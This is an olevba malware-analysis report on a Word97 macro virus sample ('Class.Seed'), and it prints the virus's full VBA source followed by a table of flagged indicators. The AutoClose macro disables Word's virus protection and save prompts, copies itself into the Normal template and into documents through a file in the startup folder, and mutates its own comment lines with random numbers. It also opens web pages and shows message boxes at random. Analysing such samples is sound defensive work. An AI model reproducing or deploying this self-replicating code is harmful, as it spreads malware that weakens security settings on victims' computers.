olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.x-edb3a8cfe690a0038d379da562428051fb2a289b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.x-edb3a8cfe690a0038d379da562428051fb2a289b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'23588045056453076767361,06871952023145E+21235880450564530767673623588045056
Randomize
'15732183184498298470767,83932282230339E+20157321831844982984707615732183184
s = 0: r = 0
'2431821924927018164416,57033645827909E+1924318219249270181644124318219249
On Error GoTo 87
'785849089753991189215,92523289154705E+1978584908975399118921785849089
Options.VirusProtection = False
'2268712161818131609001,8561051306368E+202268712161818131609002268712161
Options.SaveNormalPrompt = False
'267806250016996655294,55181051575756E+18267806250016996655292678062500
Options.ConfirmConversions = False
'4672542736797712238443,72734452514112E+204672542736797712238444672542736
fx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'183835633961400672252,5749347104893E+181838356339614006722518383563396
xf = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'1053517488119618698492,06686419529761E+1910535174881196186984910535174881
If xf > 90 And fx > 0 Then GoTo 87
'6673092721114509260817,64130914798302E+196673092721114509260816673092721
If xf < 90 Then
'741854169320671393292,37891409991225E+1974185416932067139329741854169
    Set xs = NormalTemplate.VBProject.VBComponents.Item(1)
'915909696652485718445,97617996020722E+1991590969665248571844915909696
    ActiveDocument.VBProject.VBComponents.Item(1).Name = xs.Name
'12000107025500251375696,00307004768348E+20120001070255002513756912000107025
    ActiveDocument.VBProject.VBComponents.Item(1).Export Application.StartupPath & Chr(83) + Chr(69) + Chr(69) + Chr(68)
'28738725625338482724419,72756214562148E+20287387256253384827244128738725625
End If
'846868201343498035692,90897563531824E+1984686820134349803569846868201
If fx = 0 Then Set xs = ActiveDocument.VBProject.VBComponents.Item(1)
'7862191561187079477291,47085468758573E+207862191561187079477297862191561
k = Int(Rnd(1) * 100) + 1
'37614275136234601298898,82435780371143E+20376142751362346012988937614275136
If k = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.cannabisculture.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68)
'314778564559530639361,76128251171743E+1931477856455953063936314778564
l = Int(Rnd(1) * 75) + 1
'2318326201711571630091,64965515392593E+202318326201711571630092318326201
If l = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.Microsoft.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68)
'6181733376412715477162,55129703995174E+206181733376412715477166181733376
m = Int(Rnd(1) * 50) + 1
'10434009609341118736363,55923617299018E+20104340096093411187363610434009609
If m = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'39586673296824700549763,26471512303807E+21395866732968247005497639586673296
n = Int(Rnd(1) * 25) + 1
'1911803982428993917165,54306862918637E+1919118039824289939171619118039824
If n = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(83) + Chr(69) + Chr(69) + Chr(68)
'5947957129749719161004,45929742841785E+205947957129749719161005947957129
xs.codemodule.AddFromFile Application.StartupPath & Chr(83) + Chr(69) + Chr(69) + Chr(68)
'14189812641145762158242,06833771557339E+20141898126411457621582414189812641
With xs.codemodule
'197936761747929512891,48042745237754E+1919793676174792951289197936761
    For poly = 1 To 4
'16139669764165215032962,66651607202278E+20161396697641652150329616139669764
    .deletelines 1
'27010265104238968313966,4545975115155E+20270102651042389683139627010265104
    Next poly
'22662291600461841590251,04663887912532E+21226622916004618415902522662291600
End With
'1768707136365333527696,46168017445357E+191768707136365333527691768707136
If xf < 90 Then
'15808284361275606481964,3568656385585E+20158082843612756064819615808284361
    With xs.codemodule
'1384928848944515584006,16509165072313E+1913849288489445155840013849288489
    .replaceline 1, "Sub AutoClose()"
'827827984293903020962,43301145332827E+1982782798429390302096827827984
    .replaceline 93, "Sub ToolsMacro()"
'40863005316560789761002,29155549849014E+21408630053165607897610040863005316
    End With
'372142681489011304961,81981978067123E+1937214268148901130496372142681
End If
'15795211041475462386017,51002872908536E+20157952110414754623860115795211041
With xs.codemodule
'521939716212229537611,10771024586975E+1952193971621222953761521939716
    For poly = 2 To 92 Step 2
'357197475687441201003,12337762606322E+19357197475687441201003571974756
    r = Int(Rnd(412835) * 203989) + 8485
'325225156001893651216,15863010181839E+183252251560018936512132522515600
    s = Int(Rnd(384958) * 285865) + 2988
'548947628178062526094,28522385405999E+19548947628178062526095489476281
    .replaceline poly, "'" & r * r & s * s & r * r * s * s & r * r & s * s & r * r
'154990050258680683691,34541960131746E+191549900502586806836915499005025
Next poly
'23250150400470777166761,09456399320559E+21232501504004707771667623250150400
End With
'20514832900462847893219,4952471873202E+20205148329004628478932120514832900
87:
'3118887409826361262252,57732773611687E+203118887409826361262253118887409
If xf > 90 And fx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'22545022500274687531696,19283658242051E+20225450225002746875316922545022500
End Sub
'2713368100693853549211,88268008649819E+202713368100693853549212713368100
Sub ToolsMacro()
'Word97/Class.Seed by Virus :)
End Sub


















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.cannabisc|URL                                          |
|          |ulture.com          |                                             |
|IOC       |http://www.Microsoft|URL                                          |
|          |.com                |                                             |
+----------+--------------------+---------------------------------------------+

